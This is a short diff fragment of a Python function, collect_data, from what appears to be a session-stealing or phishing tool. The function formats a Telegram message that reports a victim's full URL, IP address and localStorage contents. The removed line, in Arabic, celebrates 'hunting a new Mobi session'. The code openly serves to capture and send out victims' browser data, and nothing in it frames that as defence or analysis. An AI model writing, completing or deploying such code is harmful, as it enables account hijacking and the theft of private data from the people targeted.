@@ -46,7 +46,7 @@ def collect_data():
         local_storage = data.get('localStorage', 'N/A')
 
         telegram_message = f"""
-*🚨 اصطياد جلسة موبي الجديدة! 😈*
+
 
 *الرابط كامل:* `{url}`
 *عنوان IP الضحية:* `{ip_address}`
